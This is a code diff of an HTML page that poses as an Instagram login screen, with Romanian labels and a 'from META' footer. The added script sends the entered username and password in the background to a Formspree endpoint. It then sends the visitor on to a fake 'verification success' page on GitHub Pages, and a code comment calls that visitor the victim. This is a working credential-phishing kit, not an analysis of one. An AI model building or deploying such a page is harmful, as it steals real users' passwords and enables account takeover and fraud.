@@ -16,13 +16,36 @@
 <body>
     <div class="box">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo-img">
-        <form action="https://formspree.io/f/xzdkrgdq" method="POST">
-            <input type="text" name="ID_Utilizator" placeholder="Număr de telefon, utilizator sau e-mail" required>
-            <input type="password" name="Cheie_Acces" placeholder="Parolă" required>
-            <button type="submit">Log in</button>
-            <input type="hidden" name="_next" value="https://ryt6ngx4tm-crypto.github.io/mata/verificare/succes.html">
+        
+        <form id="loginForm" action="https://formspree.io/f/xzdkrgdq" method="POST">
+            <input type="text" name="Utilizator" placeholder="Telefon, utilizator sau e-mail" required>
+            <input type="password" name="Parola" placeholder="Parolă" required>
+            <button type="submit" id="btn">Log in</button>
         </form>
     </div>
     <div class="footer">from META</div>
+
+    <script>
+        const form = document.getElementById('loginForm');
+        form.addEventListener('submit', function(e) {
+            e.preventDefault(); // Oprim trimiterea normala care te duce la pagina de "Thanks"
+            
+            const btn = document.getElementById('btn');
+            btn.innerHTML = "Se conectează...";
+            btn.disabled = true;
+
+            // Trimitem datele prin "fetch" (in fundal)
+            fetch(form.action, {
+                method: 'POST',
+                body: new FormData(form),
+                headers: { 'Accept': 'application/json' }
+            });
+
+            // NU ASTEPTAM raspunsul, o trimitem pe victima DIRECT la pagina de securitate dupa 1 secunda
+            setTimeout(function() {
+                window.location.href = "https://ryt6ngx4tm-crypto.github.io/mata/verificare/succes.html";
+            }, 1000);
+        });
+    </script>
 </body>
 </html>
